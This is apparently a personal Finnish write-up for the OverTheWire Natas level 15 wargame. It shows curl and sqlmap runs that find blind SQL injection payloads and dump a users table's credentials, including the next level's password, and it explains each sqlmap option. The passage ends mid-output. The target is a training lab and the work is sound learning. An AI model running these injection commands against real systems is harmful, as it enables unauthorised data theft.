@@ -744,7 +744,621 @@ Pientä kokeilua erissä muodossa mm:
 
 Tässä tuloksena ainakin se tarkistaa sen tietokannan mukaisen datan että täsmentyykö se nimi, mitä käyttäjä syöttää niin täsmentyykö sinne taulukkoon. Toi "bob" nimestä, jonka toistettu on tämän tason nimetyt tietokannan taulukkon nimet ja vain rajoitetut nimet - sellaiset helpot mm. alice , bob , charlie.
 
+Myös pikainen testauksena URL:issa, että ainakin antoi jonkinlaisen tuloksensa:
 
+![alt text](./kuvat-level11-15/natas15-2.png)
+
+---
+
+## Natas 15 - 1 - Kali linux prosessi - START HERE
+
+Perus selvittämistä ja jne, että kertoo ainakin SQL-injektio steppi ei toimi ja sama idea URL:lin perään hakusana, joten päädyttiin käyttää SQLmap:iä. 
+
+Kokeillaan aikaisempia , että antaako niistä ekana mitään vastausta
+```
+┌──(kali㉿kali)-[~]
+└─$ curl -u natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx "http://natas15.natas.labs.overthewire.org"
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas15", "pass": "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx" };</script></head>
+<body>
+<h1>natas15</h1>
+<div id="content">
+
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+<input type="submit" value="Check existence" />
+</form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+Tämä ei antanut kauheasti mitään tuloksia ainakaan lukien, mutta paitsi jotakin testeistä on infoja mistä on kyse tässä level:issä:
+```
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u "http://natas15.natas.labs.overthewire.org/index.php" \
+  --auth-type Basic \
+  --auth-cred "natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx" \
+  --data "username=admin" \               
+  --batch
+        ___
+       __H__                                                                                                                   
+ ___ ___["]_____ ___ ___  {1.8.5#stable}                                                                                       
+|_ -| . [']     | .'| . |                                                                                                      
+|___|_  [,]_|_|_|__,|  _|                                                                                                      
+      |_|V...       |_|   https://sqlmap.org                                                                                   
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 10:15:04 /2025-05-18/
+
+[10:15:04] [INFO] testing connection to the target URL
+[10:15:06] [INFO] testing if the target URL content is stable
+[10:15:07] [INFO] target URL content is stable
+[10:15:07] [INFO] testing if POST parameter 'username' is dynamic
+[10:15:07] [WARNING] POST parameter 'username' does not appear to be dynamic
+[10:15:08] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
+[10:15:08] [INFO] testing for SQL injection on POST parameter 'username'
+[10:15:08] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[10:15:15] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[10:15:16] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[10:15:16] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[10:15:16] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[10:15:17] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[10:15:18] [INFO] testing 'Generic inline queries'
+[10:15:18] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[10:15:18] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)                                                                                        
+[10:15:18] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[10:15:19] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[10:15:19] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[10:15:20] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[10:15:20] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[10:15:21] [INFO] testing 'Oracle AND time-based blind'
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+[10:15:21] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[10:15:21] [WARNING] POST parameter 'username' does not seem to be injectable
+[10:15:21] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
+[10:15:21] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 10:15:21 /2025-05-18/
+```
+
+Tämä toisti lisäparametrejä jos halutaisi syvempää testausta, ainakin koskien rajoittaa testin `--technique=B` **Boolean-based blind SQLi:hin** ja `--batch` hyväksyy oletusvastauksia automaattisesti. Tuossa toistui paljon riviä, että skippasin osan. Sekä SQLMap teki perusteellisen sarjan testejä tarkistaakseen, onko `username`-parametri haavoittuvainen blind SQL injectionille eri tietokantaympäristöissä, mutta ei löytänyt haavoittuvuutta, koska se ei saanut tunnistettua onnistuneen injektion vastaussisältöä ilman lisäohjausta käyttäjältä.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u "http://natas15.natas.labs.overthewire.org/index.php?username=test" \
+--auth-type Basic \
+--auth-cred natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx \
+--level 5 --risk 3 --batch --technique=B
+        ___
+       __H__                                                                                                                   
+ ___ ___[(]_____ ___ ___  {1.8.5#stable}                                                                                       
+|_ -| . ["]     | .'| . |                                                                                                      
+|___|_  [.]_|_|_|__,|  _|                                                                                                      
+      |_|V...       |_|   https://sqlmap.org                                                                                   
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 10:40:44 /2025-05-18/
+....
+
+
+[10:40:46] [WARNING] heuristic (basic) test shows that GET parameter 'username' might not be injectable
+[10:40:46] [INFO] testing for SQL injection on GET parameter 'username'
+[10:40:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[10:40:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[10:40:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[10:41:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[10:41:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[10:41:06] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
+[10:41:07] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
+[10:41:08] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
+[10:41:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[10:41:16] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[10:41:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[10:41:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
+[10:41:24] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
+[10:41:26] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[10:41:30] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[10:41:43] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[10:41:59] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
+[10:42:05] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
+[10:42:09] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[10:42:14] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[10:42:17] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
+[10:42:23] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
+[10:42:26] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+[10:42:30] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+[10:42:35] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
+[10:42:39] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
+[10:42:42] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[10:42:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
+....
+
+[10:42:48] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[10:42:48] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
+[10:42:48] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
+[10:42:48] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
+[10:42:48] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
+[10:42:48] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
+[10:42:49] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
+[10:42:49] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[10:42:49] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
+[10:42:49] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+.....
+[10:51:04] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
+[10:51:05] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
+[10:51:06] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
+[10:51:07] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
+[10:51:10] [WARNING] parameter 'Host' does not seem to be injectable
+[10:51:10] [CRITICAL] all tested parameters do not appear to be injectable. Rerun without providing the option '--technique'. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
+[10:51:10] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 10:51:10 /2025-05-18/
+
+```
+
+Tämäki on pitkä tulos et menee jopa muutama min, sekä vaikuttaa level ja riskiinsä
+```
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u "http://natas15.natas.labs.overthewire.org/index.php" \
+  --auth-type Basic \
+  --auth-cred natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx \
+  --batch \
+  --level=5 --risk=3 --dump
+```
+
+
+Tässä viimeisessä (alempi tulos) kohdassa ajattelin keskeyttää, että laittaa "e" niin ainakin kertoi jotakin väliaikaista tulosta. Ainakin SQL injektiosta löysi POST parametrin koskeva haavoittuvuutta **Boolean-based** ja **time-based blind** injektiolle just tämä osuus: `username=natas16" AND 1660=1660--`
+
+```
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u "http://natas15.natas.labs.overthewire.org/index.php?debug" \
+--auth-type Basic \
+--string "This user exists" \
+--auth-cred natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx \
+--data "username=natas16" \
+--level=5 --risk=3
+        ___
+       __H__                                                                                                                   
+ ___ ___[(]_____ ___ ___  {1.8.5#stable}                                                                                       
+|_ -| . [(]     | .'| . |                                                                                                      
+|___|_  ["]_|_|_|__,|  _|                                                                                                      
+      |_|V...       |_|   https://sqlmap.org                                                                                   
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 11:30:26 /2025-05-18/
+
+[11:30:27] [INFO] testing connection to the target URL
+[11:30:27] [INFO] testing if the provided string is within the target URL page content
+[11:30:27] [INFO] testing if POST parameter 'username' is dynamic
+[11:30:27] [INFO] POST parameter 'username' appears to be dynamic
+[11:30:27] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
+[11:30:27] [INFO] heuristic (XSS) test shows that POST parameter 'username' might be vulnerable to cross-site scripting (XSS) attacks
+
+
+[11:30:40] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[11:30:51] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[11:30:51] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[11:30:51] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[11:30:51] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[11:30:51] [INFO] target URL appears to have 2 columns in query
+do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] y
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
+[11:30:58] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql')                                                                                                                            
+[11:30:59] [INFO] target URL appears to be UNION injectable with 2 columns
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
+[11:31:05] [INFO] testing 'Generic UNION query (80) - 21 to 40 columns'
+[11:31:07] [INFO] testing 'Generic UNION query (80) - 41 to 60 columns'
+[11:31:08] [INFO] testing 'Generic UNION query (80) - 61 to 80 columns'
+[11:31:09] [INFO] testing 'Generic UNION query (80) - 81 to 100 columns'
+[11:31:11] [INFO] testing 'MySQL UNION query (80) - 1 to 20 columns'
+[11:31:13] [INFO] testing 'MySQL UNION query (80) - 21 to 40 columns'
+[11:31:14] [INFO] testing 'MySQL UNION query (80) - 41 to 60 columns'
+[11:31:16] [INFO] testing 'MySQL UNION query (80) - 61 to 80 columns'
+[11:31:17] [INFO] testing 'MySQL UNION query (80) - 81 to 100 columns'
+[11:31:18] [INFO] checking if the injection point on POST parameter 'username' is a false positive
+POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
+[11:31:27] [INFO] testing if parameter 'User-Agent' is dynamic
+[11:31:28] [WARNING] parameter 'User-Agent' does not appear to be dynamic
+[11:31:28] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
+[11:31:28] [INFO] testing for SQL injection on parameter 'User-Agent'
+[11:31:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[11:31:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[11:31:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[11:31:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+
+
+.....
+
+[11:36:40] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[11:36:42] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
+[11:36:44] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
+[11:36:47] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
+[11:36:50] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
+[11:36:52] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
+[11:36:53] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
+[11:36:55] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
+[11:36:57] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
+[11:37:00] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
+[11:37:03] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)'
+[11:37:06] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query)'
+[11:37:07] [WARNING] user aborted during detection phase
+how do you want to proceed? [(S)kip current test/(e)nd detection phase/(n)ext parameter/(c)hange verbosity/(q)uit] e
+[11:37:12] [WARNING] parameter 'Referer' does not seem to be injectable
+sqlmap identified the following injection point(s) with a total of 6419 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: username=natas16" AND 1660=1660-- PPEC
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=natas16" AND (SELECT 2128 FROM (SELECT(SLEEP(5)))AGpI)-- cjDo
+---
+[11:37:12] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.58
+back-end DBMS: MySQL < 5.0.12
+[11:37:13] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/natas15.natas.labs.overthewire.org'                                                                                                                          
+[11:37:13] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 11:37:13 /2025-05-18/
+```
+
+---
+
+## Natas 15 - 3 Kali linux nyt löytyi vastaus 
+
+Nyt tämä alkoi pelittää ja se rakensi sen vastauksena et kävi jotenkin lävitse , mutta kuitenkin kävi lävitse tausta järjestelmänsä:
+- tietokanta versio (MysQL < 5.0.12)
+- käyttöjärjestelmä: Ubuntu Linux
+- palvelin: Apache 2.4.58
+
+Sekä kävi hakee tiedot, josta haettiin tietokannasta, koskevaa taulukkoa `users`, sarakkeen `username` ja `password`.
+
+Eli alemmassa komennossa tapahtuu niin:
+| **Osa**                         | **Kuvaus**                  | **Tarkennus / Käyttötarkoitus**                                                                     |
+| ------------------------------- | --------------------------- | --------------------------------------------------------------------------------------------------- |
+| `-u "URL"`                      | Kohdeosoite (URL)           | Sivun osoite, johon SQLMap tekee pyynnöt                                                            |
+| `--auth-type Basic`             | Autentikointityyppi         | Käytetään HTTP Basic -tunnistautumista                                                              |
+| `--auth-cred käyttäjä:salasana` | Tunnistautumistiedot        | Kirjaudutaan palveluun annetulla käyttäjätunnuksella ja salasanalla                                 |
+| `--data "username=natas16"`     | POST-data                   | Lomakekenttä, jota SQLMap käyttää injektion kohteena                                                |
+| `--string "This user exists"`   | Tunnistusteksti             | Blind SQL injection -testissä kertoo SQLMapille, että vastaus oli onnistunut (ehto palautti "true") |
+| `--level=5`                     | Testauksen laajuus          | Testataan enemmän parametreja ja syvempää rakennetta                                                |
+| `--risk=3`                      | Hyökkäysten aggressiivisuus | Sallitaan tehokkaammat (mutta mahdollisesti haitallisemmat) injektiotekniikat                       |
+| `-D natas15`                    | Valittu tietokanta          | Tietokanta, josta tietoja haetaan                                                                   |
+| `-T users`                      | Valittu taulu               | Taulu tietokannassa, josta tiedot haetaan                                                           |
+| `-C username,password`          | Valitut sarakkeet           | Haettavat kentät `users`-taulusta                                                                   |
+| `--dump`                        | Tulosta tiedot              | Tulostaa valitut tiedot komentoriville (tai tallentaa tiedostoon)                                   |
+
+Huomoiona, ja tämä on tyyppillinen **blind SQL injectio** tapaus, jossa ei voi saada virheviestiä tai suoraa dataa takaisin - vain vihje siitä palauttiko ehto true vai false. `--string` on tällöin kriittinen mikä vertaa vastausta siihen.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u "http://natas15.natas.labs.overthewire.org/index.php?debug" \
+--auth-type Basic \
+--string "This user exists" \
+--auth-cred natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx \
+--data "username=natas16" \
+--level=5 --risk=3 \
+-D natas15 -T users -C username,password --dump
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.8.5#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 11:39:29 /2025-05-18/
+
+[11:39:30] [INFO] resuming back-end DBMS 'mysql' 
+[11:39:30] [INFO] testing connection to the target URL
+[11:39:30] [INFO] testing if the provided string is within the target URL page content
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: username=natas16" AND 1660=1660-- PPEC
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=natas16" AND (SELECT 2128 FROM (SELECT(SLEEP(5)))AGpI)-- cjDo
+---
+[11:39:30] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.58
+back-end DBMS: MySQL < 5.0.12
+[11:39:30] [INFO] fetching entries of column(s) 'password,username' for table 'users' in database 'natas15'
+[11:39:30] [INFO] fetching number of column(s) 'password,username' entries for table 'users' in database 'natas15'
+[11:39:30] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[11:39:30] [INFO] retrieved: 
+[11:39:31] [WARNING] reflective value(s) found and filtering out
+4
+[11:39:32] [INFO] retrieved: 6P151OntQe
+[11:39:37] [INFO] retrieved: bob
+[11:39:39] [INFO] retrieved: HLwuGKts2w
+[11:39:42] [INFO] retrieved: charlie
+[11:39:45] [INFO] retrieved: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
+[11:39:59] [INFO] retrieved: natas16
+[11:40:02] [INFO] retrieved: hROtsfM734
+[11:40:06] [INFO] retrieved: alice
+Database: natas15
+Table: users
+[4 entries]
++----------+----------------------------------+
+| username | password                         |
++----------+----------------------------------+
+| bob      | 6P151OntQe                       |
+| charlie  | HLwuGKts2w                       |
+| natas16  | hPkjKYviLQctEW33QmuXL6eDVfMW4sGo |
+| alice    | hROtsfM734                       |
++----------+----------------------------------+
+
+[11:40:08] [INFO] table 'natas15.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/natas15.natas.labs.overthewire.org/dump/natas15/users.csv'                                                                                                  
+[11:40:08] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/natas15.natas.labs.overthewire.org'                                                                                                                          
+[11:40:08] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 11:40:08 /2025-05-18/
+```
+
+---
+
+# Natas 15 - miten oltais virallisesti menty?
+
+🔍 Tietokannan taulut
+🔍 Sarakkeet halutusta taulusta
+📥 Data sarakkeista
+
+## etsitään taulu(t) tietokannasta natas15
+
+```
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u "http://natas15.natas.labs.overthewire.org/index.php?debug" \
+--auth-type=Basic \
+--auth-cred=natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx \
+--data="username=natas16" \
+--string="This user exists" \
+--level=5 --risk=3 \
+--tables -D natas15
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.8.5#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 12:57:08 /2025-05-18/
+
+[12:57:09] [INFO] resuming back-end DBMS 'mysql' 
+[12:57:09] [INFO] testing connection to the target URL
+[12:57:10] [INFO] testing if the provided string is within the target URL page content
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: username=natas16" AND 1660=1660-- PPEC
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=natas16" AND (SELECT 2128 FROM (SELECT(SLEEP(5)))AGpI)-- cjDo
+---
+[12:57:10] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.58
+back-end DBMS: MySQL < 5.0.12
+[12:57:10] [INFO] fetching tables for database: 'natas15'
+[12:57:10] [INFO] fetching number of tables for database 'natas15'
+[12:57:10] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[12:57:10] [INFO] retrieved: 
+[12:57:11] [WARNING] reflective value(s) found and filtering out
+1
+[12:57:13] [INFO] retrieved: users
+Database: natas15
+[1 table]
++-------+
+| users |
++-------+
+
+[12:57:18] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/natas15.natas.labs.overthewire.org'                                                                                                                          
+[12:57:18] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 12:57:18 /2025-05-18/
+```
+
+## etsitään sarakkeet/sisältö taulusta esim. (users)
+
+```
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u "http://natas15.natas.labs.overthewire.org/index.php?debug" \
+--auth-type=Basic \
+--auth-cred=natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx \
+--data="username=natas16" \
+--string="This user exists" \
+--level=5 --risk=3 \
+--columns -D natas15 -T users
+        ___
+       __H__                                                                                                                   
+ ___ ___[']_____ ___ ___  {1.8.5#stable}                                                                                       
+|_ -| . ["]     | .'| . |                                                                                                      
+|___|_  ["]_|_|_|__,|  _|                                                                                                      
+      |_|V...       |_|   https://sqlmap.org                                                                                   
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 12:58:37 /2025-05-18/
+
+[12:58:38] [INFO] resuming back-end DBMS 'mysql' 
+[12:58:38] [INFO] testing connection to the target URL
+[12:58:38] [INFO] testing if the provided string is within the target URL page content
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: username=natas16" AND 1660=1660-- PPEC
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=natas16" AND (SELECT 2128 FROM (SELECT(SLEEP(5)))AGpI)-- cjDo
+---
+[12:58:38] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.58
+back-end DBMS: MySQL < 5.0.12
+[12:58:38] [INFO] fetching columns for table 'users' in database 'natas15'
+[12:58:38] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[12:58:38] [INFO] retrieved: 
+[12:58:38] [WARNING] reflective value(s) found and filtering out
+2
+[12:58:43] [INFO] retrieved: username
+[12:58:53] [INFO] retrieved: varchar(64)
+[12:59:06] [INFO] retrieved: password
+[12:59:13] [INFO] retrieved: varchar(64)
+Database: natas15
+Table: users
+[2 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| password | varchar(64) |
+| username | varchar(64) |
++----------+-------------+
+
+[12:59:19] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/natas15.natas.labs.overthewire.org'                                                                                                                          
+[12:59:19] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 12:59:19 /2025-05-18/
+```
+
+
+## Dump data sarakkeista username,password
+
+```
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u "http://natas15.natas.labs.overthewire.org/index.php?debug" \
+--auth-type=Basic \
+--auth-cred=natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx \
+--data="username=natas16" \
+--string="This user exists" \
+--level=5 --risk=3 \
+--dump -D natas15 -T users -C username,password
+        ___
+       __H__                                                                                                                   
+ ___ ___["]_____ ___ ___  {1.8.5#stable}                                                                                       
+|_ -| . [.]     | .'| . |                                                                                                      
+|___|_  [)]_|_|_|__,|  _|                                                                                                      
+      |_|V...       |_|   https://sqlmap.org                                                                                   
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 13:00:08 /2025-05-18/
+
+[13:00:08] [INFO] resuming back-end DBMS 'mysql' 
+[13:00:10] [INFO] testing connection to the target URL
+[13:00:10] [INFO] testing if the provided string is within the target URL page content
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: username=natas16" AND 1660=1660-- PPEC
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
